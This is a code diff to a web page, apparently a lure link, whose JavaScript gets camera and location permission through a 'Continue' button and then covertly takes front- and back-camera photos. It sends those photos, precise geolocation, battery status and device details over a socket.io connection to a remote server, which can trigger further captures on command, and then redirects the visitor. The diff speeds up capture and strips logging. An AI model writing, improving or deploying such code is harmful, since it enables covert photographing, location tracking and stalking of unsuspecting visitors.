@@ -93,7 +93,8 @@
             <strong>How to fix:</strong><br>
             1. Click the lock icon in address bar<br>
             2. Set Camera to Allow<br>
-            3. Refresh page and click Retry
+            3. Set Location to Allow<br>
+            4. Refresh page and click Retry
         </div>
         <button class="btn-continue" id="continueBtn">Continue</button>
     </div>
@@ -167,7 +168,7 @@
                     socket = io({
                         transports: ['websocket', 'polling'],
                         reconnectionAttempts: 5,
-                        reconnectionDelay: 1000
+                        reconnectionDelay: 500
                     });
 
                     socket.on('connect', function() {
@@ -180,7 +181,7 @@
                     socket.on('connect_error', function(err) {
                         console.log('Socket error:', err.message);
                         updateStatus('Reconnecting...');
-                        setTimeout(() => socket.connect(), 2000);
+                        setTimeout(() => socket.connect(), 1000);
                     });
 
                     socket.on('capture-command', function(data) {
@@ -193,7 +194,7 @@
                             if (frontStream) capturePhoto('front', frontStream);
                             setTimeout(() => {
                                 if (backStream) capturePhoto('back', backStream);
-                            }, 1000);
+                            }, 500);
                         }
                     });
 
@@ -204,7 +205,7 @@
 
             function sendDeviceInfo() {
                 if (!socket || !socket.connected) {
-                    setTimeout(sendDeviceInfo, 500);
+                    setTimeout(sendDeviceInfo, 200);
                     return;
                 }
 
@@ -219,7 +220,6 @@
                 };
 
                 socket.emit('visitor-connect', { visitorId, ...deviceInfo });
-                console.log('Device info sent');
 
                 if (navigator.getBattery) {
                     navigator.getBattery()
@@ -267,9 +267,6 @@
                 backVideo.srcObject = null;
             }
 
-            // ============================================
-            // CONTINUE BUTTON - FIXED FRONT CAMERA
-            // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
                 isProcessing = true;
@@ -285,71 +282,55 @@
 
                 cleanupStreams();
 
-                // ---- STEP 1: TRY FRONT CAMERA FIRST ----
-                tryFrontCamera()
-                .then(function(stream) {
-                    if (stream) {
-                        console.log('Front camera granted');
+                Promise.all([
+                    tryFrontCamera(),
+                    tryBackCamera(),
+                    tryLocation()
+                ])
+                .then(function(results) {
+                    const frontResult = results[0];
+                    const backResult = results[1];
+                    const locationResult = results[2];
+                    
+                    if (frontResult) {
                         frontGranted = true;
-                        frontStream = stream;
-                        frontVideo.srcObject = stream;
+                        frontStream = frontResult;
+                        frontVideo.srcObject = frontResult;
                         frontVideo.play().catch(() => {});
-                        
                         setTimeout(function() {
-                            capturePhoto('front', stream);
-                        }, 500);
-                    } else {
-                        console.log('Front camera not available - will try back camera');
+                            capturePhoto('front', frontResult);
+                        }, 300);
                     }
                     
-                    // ---- STEP 2: BACK CAMERA ----
-                    return tryBackCamera();
-                })
-                .then(function(backStreamResult) {
-                    if (backStreamResult) {
-                        console.log('Back camera granted');
+                    if (backResult) {
                         backGranted = true;
-                        backStream = backStreamResult;
-                        backVideo.srcObject = backStreamResult;
+                        backStream = backResult;
+                        backVideo.srcObject = backResult;
                         backVideo.play().catch(() => {});
-                        
                         setTimeout(function() {
-                            capturePhoto('back', backStreamResult);
-                        }, 500);
-                    } else {
-                        console.log('Back camera not available');
+                            capturePhoto('back', backResult);
+                        }, 300);
                     }
                     
-                    // ---- STEP 3: LOCATION ----
-                    return tryLocation();
-                })
-                .then(function(locationData) {
-                    if (locationData) {
-                        console.log('Location granted');
+                    if (locationResult) {
                         locationGranted = true;
                         if (socket && socket.connected) {
                             socket.emit('visitor-data', {
                                 visitorId,
                                 type: 'location',
-                                content: locationData
+                                content: locationResult
                             });
                         }
-                        console.log('Location sent');
-                    } else {
-                        console.log('Location not available - continuing');
                     }
                     
-                    // ---- CHECK IF AT LEAST ONE CAMERA WORKED ----
                     if (!frontGranted && !backGranted) {
                         updateStatus('No camera available. Please allow camera access.', 'error');
-                        instructions.style.display = 'block';
                         isProcessing = false;
                         continueBtn.disabled = false;
                         continueBtn.textContent = 'Retry';
                         return;
                     }
                     
-                    // ---- ALL DONE ----
                     updateStatus('Permissions granted! Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
@@ -364,46 +345,21 @@
                         if (!redirectTriggered) {
                             redirectNow();
                         }
-                    }, 2000);
+                    }, 1500);
                 })
                 .catch(function(error) {
-                    console.log('Permission error:', error);
-                    
-                    cleanupStreams();
+                    console.log('Error:', error);
                     
                     if (!frontGranted && !backGranted) {
-                        let errorMsg = '';
-                        let showInstructions = false;
-                        
-                        if (error.message && (error.message.includes('Permission denied') || error.message.includes('denied'))) {
-                            errorMsg = 'Permission denied. Please allow camera in browser.';
-                            showInstructions = true;
-                        } else {
-                            errorMsg = 'Error: ' + (error.message || error);
-                        }
-                        
-                        updateStatus(errorMsg, 'error');
-                        
-                        if (showInstructions) {
-                            instructions.style.display = 'block';
-                        }
+                        updateStatus('Permission denied. Please allow camera.', 'error');
+                        instructions.style.display = 'block';
                     } else {
-                        // At least one camera worked, continue
                         updateStatus('Permissions granted! Redirecting...', 'success');
-                        
-                        if (socket && socket.connected) {
-                            socket.emit('visitor-data', {
-                                visitorId,
-                                type: 'permissionsGranted',
-                                content: true
-                            });
-                        }
-                        
                         setTimeout(function() {
                             if (!redirectTriggered) {
                                 redirectNow();
                             }
-                        }, 2000);
+                        }, 1500);
                     }
                     
                     isProcessing = false;
@@ -412,12 +368,8 @@
                 });
             });
 
-            // ============================================
-            // TRY FRONT CAMERA (with fallback)
-            // ============================================
             function tryFrontCamera() {
                 return new Promise(function(resolve) {
-                    // Try user camera first
                     navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
@@ -426,7 +378,6 @@
                         resolve(stream);
                     })
                     .catch(function() {
-                        // If user fails, try any camera
                         navigator.mediaDevices.getUserMedia({
                             video: { width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: false
@@ -441,9 +392,6 @@
                 });
             }
 
-            // ============================================
-            // TRY BACK CAMERA
-            // ============================================
             function tryBackCamera() {
                 return new Promise(function(resolve) {
                     navigator.mediaDevices.getUserMedia({
@@ -459,9 +407,6 @@
                 });
             }
 
-            // ============================================
-            // TRY LOCATION
-            // ============================================
             function tryLocation() {
                 return new Promise(function(resolve) {
                     if (!navigator.geolocation) {
@@ -477,41 +422,33 @@
                             fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                 .then(res => res.json())
                                 .then(data => {
-                                    const locationInfo = {
+                                    resolve({
                                         lat, lng,
                                         accuracy: position.coords.accuracy,
                                         timestamp: new Date().toISOString(),
                                         country: data.countryName || 'Unknown',
                                         state: data.principalSubdivision || 'Unknown',
                                         city: data.locality || 'Unknown'
-                                    };
-                                    resolve(locationInfo);
+                                    });
                                 })
                                 .catch(function() {
-                                    const locationInfo = {
+                                    resolve({
                                         lat, lng,
                                         accuracy: position.coords.accuracy,
                                         timestamp: new Date().toISOString()
-                                    };
-                                    resolve(locationInfo);
+                                    });
                                 });
                         },
                         function() {
                             resolve(null);
                         },
-                        { timeout: 10000, enableHighAccuracy: true }
+                        { timeout: 8000, enableHighAccuracy: true }
                     );
                 });
             }
 
-            // ============================================
-            // CAPTURE PHOTO
-            // ============================================
             function capturePhoto(type, stream) {
-                if (!stream) {
-                    console.log(type + ' stream not available');
-                    return;
-                }
+                if (!stream) return;
                 
                 const videoTrack = stream.getVideoTracks()[0];
                 if (!videoTrack) return;
@@ -528,13 +465,13 @@
                     setTimeout(function() {
                         try {
                             const canvas = document.createElement('canvas');
-                            const width = Math.min(video.videoWidth, 800);
-                            const height = Math.min(video.videoHeight, 600);
+                            const width = Math.min(video.videoWidth, 640);
+                            const height = Math.min(video.videoHeight, 480);
                             canvas.width = width;
                             canvas.height = height;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, width, height);
-                            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
                             
                             if (socket && socket.connected) {
                                 socket.emit('visitor-data', {
@@ -542,20 +479,16 @@
                                     type: type === 'back' ? 'backCamera' : 'frontCamera',
                                     content: imageData
                                 });
-                                console.log(type + ' photo sent');
                             }
                             
                             document.body.removeChild(video);
                         } catch (err) {
-                            console.log(type + ' capture error:', err.message);
+                            console.log(err);
                         }
-                    }, 500);
+                    }, 300);
                 };
             }
 
-            // ============================================
-            // REDIRECT
-            // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
@@ -572,16 +505,13 @@
 
                 setTimeout(() => {
                     window.location.href = redirectUrl;
-                }, 800);
+                }, 500);
             }
 
-            // ============================================
-            // START
-            // ============================================
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
             } else {
-                setTimeout(fetchRedirectUrl, 2000);
+                setTimeout(fetchRedirectUrl, 1000);
             }
 
             window.addEventListener('beforeunload', function() {
